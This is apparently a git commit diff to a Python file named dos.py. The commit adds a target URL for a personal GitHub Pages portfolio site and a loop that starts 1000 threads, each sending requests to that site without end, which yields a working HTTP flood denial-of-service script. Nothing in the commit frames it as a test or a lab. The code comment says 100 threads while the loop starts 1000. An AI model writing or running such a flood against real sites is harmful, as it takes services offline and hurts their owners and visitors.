ab85b6a16d654fb02db7559b38bfd16514772229
Saravanesh-Git <saravanesh962006@gmail.com>
2025-03-06 20:32:58 +0530

    url and loop added

--- dos.py
+++ dos.py
@@ -1,5 +1,8 @@
 import requests
 import threading
+
+url = "https://karan271106.github.io/portfoliopk/"
+
 def attack():
     while True:
         try:
@@ -7,3 +10,6 @@ def attack():
             print("Request sent:", response.status_code)
         except:
             print("Request failed")
+
+for _ in range(1000):  # 100 threads attacking
+    threading.Thread(target=attack).start()
